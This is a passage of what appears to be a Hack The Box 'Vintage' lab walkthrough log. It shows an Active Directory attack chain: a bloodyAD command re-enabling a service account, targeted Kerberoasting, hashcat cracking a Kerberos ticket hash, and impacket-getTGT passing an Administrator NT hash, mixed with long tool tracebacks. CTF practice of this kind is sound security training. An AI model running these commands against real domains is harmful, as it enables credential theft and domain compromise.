...
WARNING: DCE/RPC connection failed: [Errno Connection error (10.129.231.205:445)] timed out
ERROR: Unhandled exception in computer dc01.vintage.htb processing: The NETBIOS connection with the remote host timed out.
INFO: Traceback (most recent call last):
  File "/usr/local/lib/python3.13/dist-packages/impacket/nmb.py", line 987, in non_polling_read
...
Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/bloodhound/enumeration/computers.py", line 128, in process_computer
    ...
    ~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/bloodhound/ad/computer.py", line 825, in rpc_resolve_sids
    resp = lsad.hLsarOpenPolicy2(dce, lsat.POLICY_LOOKUP_NAMES | MAXIMUM_ALLOWED)
  File "/usr/local/lib/python3.13/dist-packages/impacket/dcerpc/v5/lsad.py", line 1420, in hLsarOpenPolicy2
    return dce.request(request)
           ~~~~~~~~~~~^^^^^^^^^
  File "/usr/local/lib/python3.13/dist-packages/impacket/dcerpc/v5/rpcrt.py", line 1414, in request
    self.call(request.opnum, request, uuid)
    ~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.13/dist-packages/impacket/dcerpc/v5/rpcrt.py", line 1403, in call
    return self.send(DCERPC_RawCall(function, body.getData(), uuid))
           ~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.13/dist-packages/impacket/dcerpc/v5/rpcrt.py", line 1860, in send
    self._transport_send(data)
    ~~~~~~~~~~~~~~~~~~~~^^^^^^
  File "/usr/local/lib/python3.13/dist-packages/impacket/dcerpc/v5/rpcrt.py", line 1797, in _transport_send
    self._transport.send(rpc_packet.get_packet(), forceWriteAndx = forceWriteAndx, forceRecv = forceRecv)
    ~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.13/dist-packages/impacket/dcerpc/v5/transport.py", line 543, in send
    self.__smb_connection.writeFile(self.__tid, self.__handle, data)
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.13/dist-packages/impacket/smbconnection.py", line 569, in writeFile
    return self._SMBConnection.writeFile(treeId, fileId, data, offset)
           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.13/dist-packages/impacket/smb3.py", line 1742, in writeFile
    written = self.write(treeId, fileId, writeData, writeOffset, len(writeData))
  File "/usr/local/lib/python3.13/dist-packages/impacket/smb3.py", line 1444, in write
    ans = self.recvSMB(packetID)
  File "/usr/local/lib/python3.13/dist-packages/impacket/smb3.py", line 515, in recvSMB
    data = self._NetBIOSSession.recv_packet(self._timeout)
  File "/usr/local/lib/python3.13/dist-packages/impacket/nmb.py", line 918, in recv_packet
    data = self.__read(timeout)
  File "/usr/local/lib/python3.13/dist-packages/impacket/nmb.py", line 1005, in __read
    data = self.read_function(4, timeout)
  File "/usr/local/lib/python3.13/dist-packages/impacket/nmb.py", line 989, in non_polling_read
...
┌──(root㉿kali)-[/home/…/Desktop/htb/vintage/gMSADumper]
...
┌──(root㉿kali)-[/home/…/Desktop/htb/vintage/gMSADumper]
└─# bloodyAD -u gmsa01$ -k --host dc01.vintage.htb -d vintage.htb remove uac 'svc_sql' -f ACCOUNTDISABLE       
[-] ['ACCOUNTDISABLE'] property flags removed from svc_sql's userAccountControl

```

```bash
 python3 targetedKerberoast/targetedKerberoast.py -v -d 'vintage.htb' -k --no-pass
[*] Starting kerberoast attacks
[!] Error while anonymous logging into vintage.htb
Traceback (most recent call last):
  File "/usr/local/lib/python3.13/dist-packages/impacket/smbconnection.py", line 292, in login
    return self._SMBConnection.login(user, password, domain, lmhash, nthash)
           ~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.13/dist-packages/impacket/smb3.py", line 1008, in login
    if ans.isValidAnswer(STATUS_MORE_PROCESSING_REQUIRED):
       ~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.13/dist-packages/impacket/smb3structs.py", line 466, in isValidAnswer
...
Traceback (most recent call last):
  File "/home/zs1n/Desktop/htb/vintage/gMSADumper/targetedKerberoast/targetedKerberoast.py", line 32, in get_machine_name
    s.login('', '')
    ~~~~~~~^^^^^^^^
  File "/usr/local/lib/python3.13/dist-packages/impacket/smbconnection.py", line 294, in login
...
Traceback (most recent call last):
  File "/home/zs1n/Desktop/htb/vintage/gMSADumper/targetedKerberoast/targetedKerberoast.py", line 527, in main
    ldap_server, ldap_session = init_ldap_session(dc_ip=args.dc_ip, use_kerberos=use_kerb, use_ldaps=args.use_ldaps, domain=args.auth_domain, username=args.auth_username, password=args.auth_password, lmhash=auth_lm_hash, nthash=auth_nt_hash)
                                ~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/zs1n/Desktop/htb/vintage/gMSADumper/targetedKerberoast/targetedKerberoast.py", line 233, in init_ldap_session
    target = get_machine_name(dc_ip, domain)
  File "/home/zs1n/Desktop/htb/vintage/gMSADumper/targetedKerberoast/targetedKerberoast.py", line 35, in get_machine_name
...
====================================================================================================================================================
* Device #01: cpu-haswell-Intel(R) Core(TM) i7-10700 CPU @ 2.90GHz, 5626/11252 MB (2048 MB allocatable), 16MCU
...
Host memory allocated for this attack: 516 MB (6827 MB free)
...
Hash.Target......: $krb5tgs$23$*svc_sql$VINTAGE.HTB$vintage.htb/svc_sq...f6a34e
Time.Started.....: Mon Dec 29 21:39:56 2025 (0 secs)
Time.Estimated...: Mon Dec 29 21:39:56 2025 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  4497.1 kH/s (1.54ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
...
Candidates.#01...: alexliam -> Leslee
Hardware.Mon.#01.: Util: 13%

Started: Mon Dec 29 21:39:54 2025
Stopped: Mon Dec 29 21:39:58 2025
...
┌──(root㉿kali)-[/home/zs1n/Desktop/htb/vintage]
┌──(root㉿kali)-[/home/zs1n/Desktop/htb/vintage]
...
```bash
impacket-getTGT vintage.htb/Administrator -hashes :468c7497513f8243b59980f2240a10de -dc-ip 10.129.231.205
Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its affiliated companies 
